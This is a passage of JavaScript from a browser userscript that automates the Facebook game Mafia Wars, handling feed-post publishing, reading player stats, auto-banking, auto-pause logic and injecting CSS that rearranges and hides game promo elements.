          if (checkPublish('.//div[contains(., "prizes are given away each week")]','autoLottoOpt', skipElt, pubElt)) return;

          // Secret Stash
          if (checkPublish('.//div[contains(.,"secret stash")]','autoSecretStash', pubElt, skipElt)) return;

          // Share Coins
          if (checkPublish('.//div[contains(.,"to step up and fight")]','autoShareCoins', pubElt, skipElt)) return;

          // Iced Opponent
          if (checkPublish('.//div[contains(.,"just iced")]','autoIcePublish', pubElt, skipElt)) return;
          if (checkPublish('.//div[contains(.,"is cold blooded!")]','autoIcePublish', pubElt, skipElt)) return;

          // Level up bonus
          if (checkPublish('.//div[contains(.,"promoted")]','autoLevelPublish', pubElt, skipElt)) return;
          if (checkPublish('.//div[contains(.,"is gaining control")]','autoLevelPublish', pubElt, skipElt)) return;

          // Achievement bonus
          if (checkPublish('.//div[contains(.,"earned the")]','autoAchievementPublish', pubElt, skipElt)) return;

          // missions
          if (checkPublish('.//div[contains(.,"needs help to")]','AskMissionHelp', pubElt, skipElt)) return;
          if (checkPublish('.//div[contains(.,"needs your expertise to")]','AskMissionHelp', pubElt, skipElt)) return;

          // Collections
          if (checkPublish('.//div[contains(.,"Crew Collection")]','autoAskHelponCC', pubElt, skipElt)) return;

          // Moscow (Social) Job Help
          if (checkPublish('.//div[contains(.,"get the job done alone in Moscow")]','selectMoscowTiercheck', pubElt, skipElt)) return;

          // Bangkok (Social) Job Help
          if (checkPublish('.//div[contains(.,"get the job done alone in Bangkok")]','selectBangkokTiercheck', pubElt, skipElt)) return;

          // Vegas (Social) Job Help
          if (checkPublish('.//div[contains(.,"get the job done alone in Vegas")]','selectVegasTiercheck', pubElt, skipElt)) return;

          // Italy (Social) Job Help
          if (checkPublish('.//div[contains(.,"get the job done alone in Italy")]','selectItalyTiercheck', pubElt, skipElt)) return;

          // Standard New York, Cuba, Moscow, Bangkok
          if (checkPublish('.//div[contains(.,"get the job done alone")]','autoAskJobHelp', pubElt, skipElt)) return;

          // Share wishlist
          if (checkPublish('.//div[contains(.,"is looking for")]','autoShareWishlist', pubElt, skipElt)) return;

          // Share Mission Rewards
          if (checkPublish('.//div[contains(.,"share the rewards")]','autoShareRewards', pubElt, skipElt)) return;
          if (checkPublish('.//div[contains(.,"wants to share the spoils")]','autoShareRewards', pubElt, skipElt)) return;

          // War Declaration
          if (checkPublish('.//div[contains(.,"gearing up for a war")]','autoWarPublish', pubElt, skipElt)) return;

          // War back up request
          if (checkPublish('.//div[contains(.,"gearing up for a war")]','autoWarResponsePublish', pubElt, skipElt)) return;

          // War rally for help
          if (checkPublish('.//div[contains(.,"sided with")]','autoWarRallyPublish', pubElt, skipElt)) return;

          // War Reward
          if (checkPublish('.//div[contains(.,"and friends overwhelmed the Mafia")]','autoWarRewardPublish', pubElt, skipElt)) return;

          // War Reward : Share Victory Coins
          if (checkPublish('.//div[contains(.,"friends rallied to win the war")]','autoWarRewardPublish', pubElt, skipElt)) return;

          // Ask for Chop Shop Parts
          if (checkPublish('.//div[contains(.,"an awesome Chop Shop") ]','askShopParts', pubElt, skipElt)) return;

          // Ask for Weapons Depot Parts
          if (checkPublish('.//div[contains(.,"an awesome Weapons Depot")]','askDepotParts', pubElt, skipElt)) return;

          // Ask for Armory Parts
          if (checkPublish('.//div[contains(.,"an awesome Armory")]','askArmorParts', pubElt, skipElt)) return;

          // Ask for Zoo Parts
          if (checkPublish('.//div[contains(.,"a Private Zoo")]','askZooParts', pubElt, skipElt)) return;
          if (checkPublish('.//div[contains(.,"create exotic animals")]','askZooParts', pubElt, skipElt)) return;

          // Ask for Casino Parts
          if (checkPublish('.//div[contains(.,"building a Casino")]','askCasinoParts', pubElt, skipElt)) return;

          // Ask for Special Parts
          //if (checkPublish('.//div[contains(.,"Special Parts")]','askSpecialParts', pubElt, skipElt)) return;

          // Ask for Energy Packs
          //needs an energy pack to wreak havoc in Mafia Wars. Send a pack to Regin. You get Loyalty Points for helping.
          if (checkPublish('.//div[contains(.,"needs an energy pack")]','askEnergyPack', pubElt, skipElt)) return;
        }
      }
    } catch (ex) {
      // Ignore exceptions
      GM_log('Publishing error: ' + ex);
    }
  }

  // If we get here, then at least one of the three buttons exists, so try again!
  DEBUG('Publish: Try again in 2 seconds.');
  window.setTimeout(handlePublishing, 1500);
}

// Turns on/off the high-level event listener for the game.
function setListenContent(on) {
  var elt = document.getElementById('mainDiv');
  if (!elt) return;
  if (on) {
    elt.addEventListener('DOMSubtreeModified', handleContentModified, false);
  } else {
    elt.removeEventListener('DOMSubtreeModified', handleContentModified, false);
  }
}

// Turns on/off the event listener for the stats section of the page.
function setListenStats(on) {
  var elt = document.getElementById('game_stats');
  if (!elt) return;
  if (on) {
    elt.addEventListener('DOMNodeInserted', statsInserted, false);
  } else {
    elt.removeEventListener('DOMNodeInserted', statsInserted, false);
  }
}

function statsInserted(e) {
  if (ignoreElement(e.target)) return;
  // Check for a change in a particular statistic. This is where we'll
  // notice some types of changes that happen without user or script
  // actions, such as earning energy.
  var parentElt = e.target.parentNode;
  if (!parentElt) return;
  if (parentElt == energyElt) {
    energy = parseInt(e.target.nodeValue);
    energyElt.style.textDecoration = (energy == maxEnergy)? 'blink' : 'none';
  } else if (parentElt == staminaElt) {
    stamina = parseInt(e.target.nodeValue);
    staminaElt.style.textDecoration = (stamina == maxStamina)? 'blink' : 'none';
  } else if (parentElt == healthElt) {
    // NOTE: At one time, health was updated on with a timer. Leave
    //       this here in case it goes back to being that way.
    health = parseInt(e.target.nodeValue);
    // Make sure 'health' is never < 0
    health = health < 0 ? 0 : health;
    healthElt.style.textDecoration = (health > 19 && health < 29)? 'blink' : 'none';
  }
}

function doQuickBank() {
  // Can bank flag
  var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank && !quickBankFail &&
                cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));

  // Do quick banking
  if (canBank && !isNaN(city) && !isNaN(cities[city][CITY_CASH])) {
    quickBank(city, cities[city][CITY_CASH]);
  }
}

function innerPageChanged(justPlay) {
  // Reset auto-reload (if enabled).
  DEBUG('innerPageChanged');
  autoReload(false, 'innerpagechanged');

  // Perform actions here not requiring response logging
  doParseMessages();
  if (running) {
    doQuickBank();
    doQuickClicks();
    if(isGMChecked('autoShareWishlist') && !timeLeftGM('wishListTimer')){
      autoWishlist();
    }
  }

  // Parse player attack/defense equip stats
  getPlayerEquip();

  // Customize the display.
  if (!justPlay) {
    setListenContent(false);
    customizeMasthead();
    customizeLayout();
    customizeBanner();
    customizeStats();
    customizeNames();
//    update_nrg_stam();  //newchange
    if (!customizeHome() &&
        !customizeJobs() &&
        !customizeNewJobs() &&
        !customizeVegasJobs() &&
        !customizeProfile() &&
        !customizeProps() &&
        !customizeMissions() &&
        !customizeHitlist()) {
      customizeFight();
    }
    setListenContent(true);
  }
  try {
    // If a click action was taken, check the response.
    if (clickAction) {
      var action = clickAction;
      var context = clickContext;
      clickAction = undefined;
      clickContext = undefined;
      if (!logResponse(innerPageElt, action, context)) {
        doAutoPlay();
      }
    } else {
      doAutoPlay();
    }
  } catch (ex) {
    addToLog('warning Icon', 'BUG DETECTED (doAutoPlay): ' + ex + '. Reloading.');
    autoReload(true, 'error');
  }
}

function chooseSides() {
  // Side-Handling
  choiceJobs.forEach( function(job) {
    var jobMatch;

    // Search the missions array for each name on the choice jobs
    for (var i = 0, iLength = job[CHOICE_JOBNAME].length; i < iLength; ++i) {
      jobMatch = missions.searchArray(job[CHOICE_JOBNAME][i], [0])[0];
      if (!isNaN(jobMatch)) break;
    }

    // Change the jobNo / jobName
    if (!isNaN(jobMatch)) {
      var sideIndex = GM_getValue(cities[job[CHOICE_CITY]][CITY_SIDE_NAME], 0);
      missions[jobMatch][MISSION_NAME] = job[CHOICE_JOBNAME][sideIndex];
      missions[jobMatch][MISSION_NUMBER] = job[CHOICE_JOBNO][sideIndex];
    }
  });
}

function closeFBPopup() {
  if (!running) return;
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (skipPostElt) clickElement (skipPostElt);
}

function refreshGlobalStats() {
  // NOTE: In this function, only elements displayed in and above the
  //       navigation bar should be examined. Everything in the inner page
  //       (what is displayed below the navigation bar) should instead be
  //       examined via innerPageChanged().

  var cityElt = document.getElementById('mw_city_wrapper');
  if (!cityElt) return false;

  if (cityElt.className.match(/mw_city(\d+)/))
    // FIXME: Not working for chrome at the moment
    //city = parseInt(RegExp.$1) - 1;
    city = parseInt(cityElt.className.replace('mw_city','')) - 1;
  else
    city = NY;

  // Once we see a FB post pop-up, set the timer to close it
  var skipPostElt = document.getElementById('fb_dialog_cancel_button');
  if (running && skipPostElt)
    window.setTimeout(closeFBPopup, 10000);

  // Set all the element globals. They change.
  cashElt = document.getElementById('user_cash_' + cities[city][CITY_ALIAS]);
  healthElt = document.getElementById('user_health');
  maxHealthElt = document.getElementById('user_max_health');
  energyElt = document.getElementById('user_energy');
  maxEnergyElt = document.getElementById('user_max_energy');
  staminaElt = document.getElementById('user_stamina');
  maxStaminaElt = document.getElementById('user_max_stamina');
  levelElt = document.getElementById('user_level');

  // Update basic player information.
  cities[city][CITY_CASH] = parseCash(cashElt.innerHTML);
  health = parseInt(healthElt.innerHTML);
  // Make sure 'health' is never < 0
  health = health < 0 ? 0 : health;
  maxHealth = parseInt(maxHealthElt.innerHTML);
  energy = parseInt(energyElt.firstChild.nodeValue);
  maxEnergy = parseInt(maxEnergyElt.innerHTML);
  stamina = parseInt(staminaElt.firstChild.nodeValue);
  maxStamina = parseInt(maxStaminaElt.innerHTML);
  level = parseInt(levelElt.innerHTML);

  // Set all the element globals. They change.
  if(new_header) {
    ptsToNextLevelElt = document.getElementById('user_xp_to_next_level');
    ptsToNextLevel = parseInt(ptsToNextLevelElt.innerHTML);
    lvlExp = ptsToNextLevel;
  } else {
    lvlExpElt = document.getElementById('exp_to_next_level'); // exp needed to level up
    lvlExp = parseInt(lvlExpElt.innerHTML);
    ptsToNextLevel = lvlExp;
  }

  mafia = GM_getValue('userMafiaSize', 0)
  if(!mafia || mafia < 501){
    // Get the mafia size and pending invites.
    mafia = xpathFirst('//span[@id="user_group_size"]');
    if(!mafia) mafia = document.getElementById('user_group_size');
    if (mafia) {
      mafia = parseInt(mafia.innerHTML.untag());
      GM_setValue('userMafiaSize', mafia);
    }
  }

  invites = xpathFirst('//span[@id="user_request"]');
  if (invites) {
    invites = parseInt(invites.innerHTML.untag());
  } else {
    invites = 0;
  }

  // Get the skill points waiting to be spent.
  var skillElt = document.getElementById('user_skill');
  if (skillElt) {
    stats = parseInt(skillElt.innerHTML);
    if (isNaN(stats)) {
      stats = 0;
    }
  } else {
    stats = 0;
  }

  // Update current level so the next if will work
  if (isGMUndefined('currentLevel')) {
    GM_setValue('currentLevel', level);
    GM_setValue('restAutoStat', 0);
  }

  // Show congratulations if level has increased.
  if (level > GM_getValue('currentLevel')) {
    GM_setValue('currentLevel', level);
    addToLog('experience Icon', '<span style="color:#00FFCC;"> Congratulations on reaching level <strong>' + level + '</strong>!</span>');
    GM_setValue('restAutoStat', 0);
  }

  return true;
}

function refreshSettings() {
  // NOTE: In this function, only elements displayed in and above the
  //       navigation bar should be examined. Everything in the inner page
  //       (what is displayed below the navigation bar) should instead be
  //       examined via innerPageChanged().

  // Refresh spend ceiling, floor and burn condition
  var canLevel = ptsToNextLevel < stamina * getStaminaGainRate() + energy * getEnergyGainRate();

  SpendStamina.refreshLimits (maxStamina, canLevel);
  SpendEnergy.refreshLimits (maxEnergy, canLevel);
//needchange
  SpendMissionStamina.refreshLimits (maxStamina, canLevel);
  SpendMissionEnergy.refreshLimits (maxEnergy, canLevel);

  // Log and toggle burning
  if (running) {
    if (isGMChecked(SpendStamina.spendFlag)) SpendStamina.toggleSpending(maxStamina, stamina);
    if (isGMChecked(SpendEnergy.spendFlag)) SpendEnergy.toggleSpending(maxEnergy, energy);
//needchange
    if (isGMChecked('AutoMafiaMission')) SpendMissionStamina.toggleSpending(maxStamina, stamina);
    if (isGMChecked('AutoMafiaMission')) SpendMissionEnergy.toggleSpending(maxEnergy, energy);
  }

  // Auto-pause reset
  if (GM_getValue('autoPauseActivated') === true &&
      isGMChecked('autoPauseBefore') &&
      GM_getValue('autoPauselvlExp') < ptsToNextLevel) {
    GM_setValue('autoPauselvlExp',ptsToNextLevel);
    GM_setValue('autoPauseActivated', false);
  }

  // Auto-pause logic
  if (running && isGMChecked('autoPause')) {
    if (isGMChecked('autoPauseBefore') &&
        GM_getValue('autoPauseExp', '') >= ptsToNextLevel &&
        GM_getValue('autoPauseActivated', false) === false) {
      addToLog('pause Icon', 'Auto-pause in effect. Experience threshold reached.');
      GM_setValue('autoPauseActivated', true);
      pause();
    } else if (isGMChecked('autoPauseAfter') &&
               GM_getValue('autoPauselvlExp', '') < ptsToNextLevel) {
      addToLog('pause Icon', 'Auto-pause in effect. Leveled up.');
      GM_setValue('autoPauselvlExp', ptsToNextLevel);
      pause();
    }
  }
}

function getStaminaGainRate() {
  var expGained    = GM_getValue('totalExpInt', 0);
  var staminaSpent = GM_getValue('fightWinCountInt', 0) +
                     GM_getValue('fightLossCountInt', 0) +
                     GM_getValue('hitmanWinCountInt',0) +
                     GM_getValue('hitmanLossCountInt',0) +
                     GM_getValue('totalRobStamInt',0);
  if (!expGained || !staminaSpent) return 2;

  return expGained / staminaSpent;
}

function getEnergyGainRate() {
  var rate = parseFloat(GM_getValue('estimateJobRatio', '2'));
  return (!isNaN(rate)) ? rate : 2;
}

function setFBParams() {
  // Get FB name
  var fbName = document.getElementById("navAccountName");
  if (fbName) GM_setValue('FBName', fbName.innerHTML);

  // Get language
  GM_setValue('language', document.documentElement.lang);

  sendMWValues(['language','FBName']);
}

// [CHROME] Copy GM values to background storage
// Note: This method is not synchronous
function copyMWValues (gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = '';
  gmPairs.action = 'getGM';
  chrome.extension.sendRequest(gmPairs, function(response) {
    for (var i in response)
      GM_setValue(i, response[i])
  });
}

// [CHROME] Fetch GM values from background storage
// Note: This method is not synchronous
function sendMWValues(gmKeys) {
  if (gvar.isGreaseMonkey) return;
  var gmPairs = {};
  for (var i in gmKeys)
    gmPairs[gmKeys[i]] = GM_getValue(gmKeys[i]);
  gmPairs.action = 'setGM';
  chrome.extension.sendRequest(gmPairs);
}

function customizeLayout() {
  var mainDiv = xpathFirst('//div[@id="mainDiv"]');
  if (!mainDiv) return;

  var missionBar = xpathFirst('//div[@id="quest_bar"]');
  if(missionBar){
    var missionLi =  xpathFirst('//li', missionBar);
    if(!missionLi){
      var missionDiv = xpathFirst('//div[@id="quest"]');
      missionDiv.style.display = 'none';
    }
  }

  // Handle Unknown error
  var unkError = xpathFirst('//div[@class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable ui-resizable"]');
  if (unkError) {
    DEBUG('Error encountered, reloading...');
    window.location.reload(true);
  }
}

function customizeBanner(){
// Add MWAP Banner
  var promobanner = document.getElementById('menubar');
  if(document.getElementById('ps_mwap_promo_banner')) {
    var mwapbanner_div = document.getElementById('ps_mwap_promo_banner');
  } else {
    var mwapbanner_div = makeElement('div', document.body, {'id':'ps_mwap_promo_banner'});
    promobanner.appendChild(mwapbanner_div);
  }
  if(!document.getElementById('mwapiFrame')) {
    var mwapiFrame = makeElement('iframe', mwapbanner_div, {'id':'mwapiFrame','src':'http://playerscripts.com/ps-adbanner/ps-adbanner.html','scrolling':'no','frameborder':'0','style':'margin:0px;padding:0px; border:none; overflow:hidden; width:750px; height:85px;','allowTransparency':'false'});
  }
}


function refreshMWAPCSS() {
  try {
    var cssElt = document.getElementById('mwapCSS');
    var mwapCSS = '';
    if (cssElt) mwapCSS = cssElt.innerHTML;
    var newCSS =  'html, body { height: 100%; margin: 0px 0px 1px 0px; padding: 0px;}' +
                  'html { overflow-y: auto !important } body { background: black; text-align: left; }' +
                  ' #mainDiv {position: absolute; top: 0px; width:758px;} div.app {padding:0; width:746px;}' +
                  'a[style$="padding: 20px 0pt 0pt; background: transparent url(http://mwfb.static.zynga.com/mwfb/graphics/zmc/envelope_sheet_43x43_01.png) no-repeat scroll 50% 50%;"] {top: 100px !important; left:755px !important;}'+
                  ' div[style$="background-color: rgb(255, 255, 255); height: 85px; padding: 0pt; margin: 0pt;"] {display:none;}'+
                  ' div[style$="margin: 0pt; padding: 0pt; background-color: rgb(255, 255, 255); height: 85px;"] {display:none;}'+
                  // Elevate freegift friendlist box:
                  ' #request_form_interstitial_exclude_type_3  {z-index:10000;}' +
                  (isGMChecked('mastheadOnTop') ? ' #mw_masthead {z-index:10000;}' : '') +
                  (isGMChecked('leftAlign') ? ' #final_wrapper {margin: 0; position: static; text-align: left; width: 760px;}' : ' #final_wrapper {margin: 0 auto; position: static; text-align: left; width: 760px;}') +

                  // Move the messagecenter button(s):
                  // I dont think this one hides anything anymore
                  (isGMChecked('hideAll') ?
                  ' div[style$="position: absolute; top: 13px; right: 126px; width: 45px; z-index: 1;"] {display: none;}' +
                  ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 1;"] {display: none;}' +
                  ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 100;"] {display: none;}' :
                  ' div[style$="position: absolute; top: 13px; right: 126px; width: 45px; z-index: 1;"] {position: relative !important; top: 15px !important; left: 755px !important; z-index: 100 !important;}' +
                  ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 1;"] {top: 15px !important; left: 755px !important; z-index: 100 !important;}' +
                  ' div[style$="position: absolute; top: 15px; right: 130px; width: 45px; z-index: 100;"] {top: 15px !important; left: 755px !important; z-index: 100 !important;}') +

                  // hide new message icons
                  (isGMChecked('hideAll') ?
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; width: 43px; z-index: 2;"] {display: none;}' +
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; padding: 20px 0pt 0pt; width: 43px; z-index: 2;"] {display: none;}' +
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; padding: 20px 0 0; width: 43px; z-index: 2;"] {display: none;}' :
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; width: 43px; z-index: 2;"] { !important; left: 760px !important; z-index: 2 !important;}' +
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; padding: 20px 0pt 0pt; width: 43px; z-index: 2;"] { !important; left: 760px !important; z-index: 2 !important;}' +
                  ' a[style$="position: absolute; top: 7px; right: 134px; height: 23px; padding: 20px 0 0; width: 43px; z-index: 2;"] { !important; left: 760px !important; z-index: 2 !important;}') +

                  // Move zstream  icon and make it smaller:
                  (isGMChecked('hideAll') ?
                  ' #zstream_icon {display: none;}' :
                  ' #zstream_icon {position: absolute; top: 65px; left:755px; z-index: 100;} ') +

                  // Move Slot Machine and click box:
                  (isGMChecked('hideAll') ?
                  ' #slots_icon_container  {display: none;}' +
                  ' #slots_icon_cover      {display: none;}' :
                  ' #slots_icon_container  {position: absolute; top: 110px; left: 755px; z-index: 99;} ' +
                  ' #slots_icon_cover      {position: absolute; top:110px; left: 755px; z-index: 100;} ') +

                // Move 'free gifts' icon and make it smaller:
                 (isGMChecked('hideAll') ?
                  ' #gifticon_container {display: none;}' :
                  ' #gifticon_container {position: absolute; top: 155px; left: 755px; z-index: 100;} ') +

                  // Move other Zynga selling Promo icon and click box and make it smaller:
                  (isGMChecked('hideAll') ?
                  ' #buyframe_link_container_anim  {display: none;}' +
                  ' #buyframe_link_cover_anim      {display: none;}' :
                  ' #buyframe_link_container_anim  {position: absolute; top: 200px; left: 755px; z-index: 100;} ' +
                  ' #buyframe_link_cover_anim      {position: absolute; top: 200px; left: 755px; z-index: 100;} ') +

                  // Move Promo and make it smaller:
                  (isGMChecked('hideAll') ?
                  ' #promoicon_container {display: none;}' :
                  ' #promoicon_container {position: absolute; top: 245px; left: 755px; z-index: 100;} ') +

                  // Move Zynga selling Promo icon and click box and make it smaller: special promotions
                  (isGMChecked('hideAll') ?
                  ' #buyframe_link_container  {display: none;}' +
                  ' #buyframe_link_cover      {display: none;}' :
                  ' #buyframe_link_container  {position: absolute; top: 290px; left: 755px; z-index: 100;} ' +
                  ' #buyframe_link_cover      {position: absolute; top: 200px; left: 755px; z-index: 100;} ') +

                  // Hide attention box   f/g
                  (isGMChecked('hideAll') ?
                  ' .header_mid_row div.header_various {display: none;}' :
                  ' .header_mid_row div.header_various {position: absolute; top: 1px; left: 825px; width: 12px; z-index: 100;} ') +

                  // Move menus and make the travelmenu button smaller:
                  // setup locked Travel menu
                  ' div[onmouseover="travelopen(event)"] {position: absolute !important; left: 248px !important; width: 110px !important;}' +
                  ' div[id="button_travel_locked"] {width: 110px !important;}' +
                  ' a[class="sexy_button_new sexy_button_new_hover_state short black sexy_lock_new"] {width: 110px !important;}' +
                  // setup UN-locked Travel menu
                  ' div[id="travel_container"] {width: 110px !important;}' +
                  ' a[class="sexy_button_new short black_white_border sexy_travel_new"] {width: 110px !important;}' +
                  ' div[id="travel_menu"] {width: 140px;}' +
                  // setup Account menu
                  ' div[onmouseover="instructionopen(event)"] {position: absolute !important;width: 90px !important; left: 365px !important;}' +
                  ' div[id="instruction_container"] {width: 90px !important;}' +
                  ' a[class="sexy_button_new short black_white_border"] {width: 90px !important;}' +
                  ' div[id="instruction_menu"] {width: 110px;}' +

                  (isGMChecked('hideZyngaBanner') ? ' div[id="header_top_promo_banner"] {display: none !important;}' : '' ) +

                  (isGMChecked('hideAll') ? ' div[class="tab_box_content"][style*="padding: 5px; text-align: center; margin-bottom: 420px;"], ' : '' ) +

                  // Hide action boxes
                  (isGMChecked('hideAll') ? ' .message_box_full, ' : '' ) +
                  (isGMChecked('hideAll') ? ' .menu_divider, ' : '' ) +

                  // Hide Limited Time Offers
                  (isGMChecked('hideAll') ? ' div[class="tab_box"][style*="left"], ' : '' ) +

                  // Hide Holiday Free Gifts / Gift Safe House / Mystery Gifts
                  (isGMChecked('hideAll') ?
                  ' img[alt="Free Holiday Gifts!"], ' +
                  ' img[alt="Gift Safe House"], ' +
                  ' img[alt="Free Mystery Bag!"], ' : '' ) +

                  // Hide the Zynga bar, progress bar, email bar, sms link, new button market place
                  ' #mwapHide, #snapi_zbar, #mw_zbar, #mw_zbar iframe, #setup_progress_bar, #intro_box, ' +
                  ' *[id*="bouncy"], .fb_email_prof_header, .mw_sms, #ajax_sync, #ajax_async' +
                  ' {position: absolute !important; margin:0 !important; ' +
                  '  height:0 !important; width: 0 !important; display: none !important;}' +
				          ' #bye_ChopShop_build_timer_cont {left: 105px; position: relative;top: -50px;}'+
				          ' #bye_WeaponsDepot_build_timer_cont {left: 105px; position: relative;top: -50px;}'+
				          ' #bye_Armory_build_timer_cont {left: 105px; position: relative;top: -50px;}'+
				          ' #bye_PrivateZoo_build_timer_cont {left: 105px; position: relative;top: -50px;}'+

                  // ********************** Stats Tab CSS **********************
                  '#statsWindow #sWindowTabNav div{border-right:1px solid #000;float:left;padding:0 7px;position:static;text-align:center}' +
                  '#statsWindow #sWindowTabNav div.selected{background : rgb(60,60,100);}' +
                  '#statsWindow #sWindowTabNav div a{color:#fff;font-weight:700}' +
                  '#statsWindow .sexy_button{position:absolute;background:black;border:1px solid #FFD927;color:#FFD927;cursor:pointer;display:block;float:left;font-size:14px;font-weight:700;padding:5px;text-decoration:none;width:auto}' +
                  '#statsWindow .sexy_button button{background:transparent;border:medium none #FFF;color:#FFD927;cursor:pointer;font-size:14px;font-weight:700;margin:0}' +
                  '#statsWindow .sexy_button button:hover{color:#BCD2EA;font-weight:700;text-decoration:none}' +
                  '#statsWindow .tabcontent{display:none;}' +
                  '#statsWindow label {font-weight: normal; color: #BCD2EA}' +
                  // ********************** Settings Box CSS **********************
                  '#MWAPSettingsBox {position:fixed; right:0px; top:0px; width: 818px; height:600px;font-size: 12px; z-index: 10002; background-color: #000;color: #BCD2EA;}' +
                  '#MWAPSettingsBox ul{display:inline;list-style-type:none;float:left;margin:0px;padding:0px;width:800px;border:0px;border-style:none;background-color: #000;}' +
                  '#MWAPSettingsBox li, #MWAPSettingsBox ul li,#MWAPSettingsBox a, #MWAPSettingsBox li a, #MWAPSettingsBox ul li a {display:inline;list-style-type:none;float:left;margin:0px;padding:0px;border:0px;border-style:none;background-color: #000;}' +
                  '#MWAPSettingsBox img{margin:0px; padding:0px;border:0px;border-style:none;}' +
                  '#MWAPSettingsBox li a.generalLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c2.png\');width:82px;height:31px;}'+
                  '#MWAPSettingsBox li a.generalLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c2_f2.png\');width:82px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.generalLink, #MWAPSettingsBox li.selected a.generalLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c2_f2.png\');width:82px;height:31px;}'+
                  '#MWAPSettingsBox li a.displayLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c3.png\');width:70px;height:31px;}'+
                  '#MWAPSettingsBox li a.displayLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c3_f2.png\');width:70px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.displayLink, #MWAPSettingsBox li.selected a.displayLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c3_f2.png\');width:70px;height:31px;}'+
                  '#MWAPSettingsBox li a.mafiaLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c4.png\');width:59px;height:31px;}'+
                  '#MWAPSettingsBox li a.mafiaLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c4_f2.png\');width:59px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.mafiaLink, #MWAPSettingsBox li.selected a.mafiaLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c4_f2.png\');width:59px;height:31px;}'+
                  '#MWAPSettingsBox li a.helpmissionsLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c5.png\');width:80px;height:31px;}'+
                  '#MWAPSettingsBox li a.helpmissionsLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c5_f2.png\');width:80px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.helpmissionsLink, #MWAPSettingsBox li.selected a.helpmissionsLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c5_f2.png\');width:80px;height:31px;}'+
                  '#MWAPSettingsBox li a.autostatLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c6.png\');width:81px;height:31px;}'+
                  '#MWAPSettingsBox li a.autostatLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c6_f2.png\');width:81px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.autostatLink, #MWAPSettingsBox li.selected a.autostatLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c6_f2.png\');width:81px;height:31px;}'+
                  '#MWAPSettingsBox li a.energyLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c8.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li a.energyLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c8_f2.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.energyLink, #MWAPSettingsBox li.selected a.energyLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c8_f2.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li a.staminaLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c9.png\');width:74px;height:31px;}'+
                  '#MWAPSettingsBox li a.staminaLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c9_f2.png\');width:74px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.staminaLink, #MWAPSettingsBox li.selected a.staminaLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c9_f2.png\');width:74px;height:31px;}'+
                  '#MWAPSettingsBox li a.healLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c11.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li a.healLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c11_f2.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.healLink, #MWAPSettingsBox li.selected a.healLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c11_f2.png\');width:67px;height:31px;}'+
                  '#MWAPSettingsBox li a.cashLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c12.png\');width:51px;height:31px;}'+
                  '#MWAPSettingsBox li a.cashLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c12_f2.png\');width:51px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.cashLink, #MWAPSettingsBox li.selected a.cashLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c12_f2.png\');width:51px;height:31px;}'+
                  '#MWAPSettingsBox li a.aboutLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c14.png\');width:58px;height:31px;}'+
